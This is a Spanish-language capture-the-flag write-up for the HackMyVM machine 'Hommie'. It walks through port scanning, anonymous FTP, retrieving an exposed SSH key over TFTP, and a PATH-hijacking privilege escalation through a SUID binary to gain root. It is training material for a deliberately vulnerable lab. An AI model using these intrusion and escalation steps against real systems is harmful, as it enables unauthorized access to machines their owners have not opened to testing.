---
layout: single
title: Hommie - HackMyVM
excerpt: "Hommie es una máquina Linux creada por sML, en esta máquina descubriremos un servicio tftp que está un poco escondido, este servidor encontraremos un archivo id_rsa que usaremos para conectarnos a la máquina. Elevaremos privilegios
con un binario que tiene permisos SUID y con una técnica llamada Path-Hijacking."
date: 2021-09-25
classes: wide
header:
  teaser: /assets/images/hmvm-Hommie/hmvmHommie.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - Fácil
tags:
  - hackmyvm
  - tftp
  - suid
  - path-hijacking
  - sML
---

### Escaneo de puertos
```bash
❯ nmap -p- --open -T5 -v -n 192.168.1.96

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Escaneo de servicios
```bash
❯ nmap -sC -sV -p 21,22,80 192.168.1.96

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.42
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c6:27:ab:53:ab:b9:c0:20:37:36:52:a9:60:d3:53:fc (RSA)
|   256 48:3b:28:1f:9a:23:da:71:f6:05:0b:a5:a6:c8:b7:b0 (ECDSA)
|_  256 b3:2e:7c:ff:62:2d:53:dd:63:97:d4:47:72:c8:4e:30 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
### HTTP (80)
Inspeccionamos el puerto 80 con curl, vemos que alexia puede ser un usuario del archivo `id_rsa`
```bash
❯ curl -s http://192.168.1.96
alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

### FTP (21)
Nos conectamos al servidor FTP.
```bash
❯ ftp 192.168.1.96
```
![](/assets/images/hmvm-Hommie/ftp.png)

Entramos al directorio `.web` y nos descargamos el index.html con el comando `get`
```bash
ftp> cd .web
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              99 Sep 30  2020 index.html
226 Directory send OK.
ftp> get index.html
local: index.html remote: index.html
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for index.html (99 bytes).
226 Transfer complete.
```

Abrimos `index.html`, vemos que es la página que vimos anteriormente con curl.

![](/assets/images/hmvm-Hommie/catindex.png)

Si intentamos subir alguna shell.php no podremos ejecutarlas porque el servidor web no interpreta código PHP y si escaneamos directorios con wfuzz no encontraremos nada, llegados a este punto toca volver a escanear con nmap.

### Escaneo de puertos (UDP)
```bash
❯  nmap -sU -sC -sV -p 1-100 192.168.1.96
Not shown: 98 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc
69/udp open|filtered tftp
```

Nmap encuentra dos puertos, el que nos interesa es el `69` TFTP (Trivial File Transfer Protocol)

![](/assets/images/hmvm-Hommie/tftp.png)

> TFTP no se puede listar el contenido de los directorios por lo que debes de saber exactamente que és lo que quieres descargar.

Damos permisos al fichero id_rsa y nos conectamos como usuario alexia. 
```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa alexia@192.168.1.96
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 30 11:06:15 2020
alexia@hommie:~$
```

Como usuario alexia podemos leer la flag de user.txt.
```bash
alexia@hommie:~$ cat user.txt 
Imxxxxxxt
```

En el directorio /opt vemos un binario con nombre `showMetheKey` con permisos SUID.
```bash
alexia@hommie:/opt$ ls -la
total 28
drwxr-xr-x  2 root root  4096 Sep 30  2020 .
drwxr-xr-x 18 root root  4096 Sep 30  2020 ..
-rwsr-sr-x  1 root root 16720 Sep 30  2020 showMetheKey
```

Le paso un strings al binario y vemos que esta imprimiendo la clave ssh con cat así que aquí podemos explotar la variable PATH.

![](/assets/images/hmvm-Hommie/stringsSUID.png)

Nos vamos al directorio /tmp y creamos un archivo con el nombre cat y en su interior lo dejamos como la imagen:

```bash
alexia@hommie:/opt$ cd /tmp
alexia@hommie:/tmp$ touch cat
alexia@hommie:/tmp$ nano cat
alexia@hommie:/tmp$ chmod +x cat
```
![](/assets/images/hmvm-Hommie/ficherocat.png)

Exportamos el PATH al directorio `/tmp` que es donde estamos actualmente.
```bash
alexia@hommie:/tmp$ export PATH=/tmp:$PATH
```

Ejecutamos el binario y obtendremos el root.
```bash
alexia@hommie:/tmp$ /opt/showMetheKey
root@hommie:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(alexia)
```

Vamos al directorio /root para leer la flag de root pero no está la flag de root  sino un fichero de texto `note.txt`.
```bash
root@hommie:/root# ls
note.txt
```

Leemos el fichero de texto con head porque con cat no podremos.
```bash
root@hommie:/root# head note.txt 
I dont remember where I stored root.txt !!!
```

Buscaremos la flag de root con find.
```bash
root@hommie:/root# find / -name root.txt
/usr/include/root.txt
root@hommie:/root# head /usr/include/root.txt 
Imxxxxxxxn
```
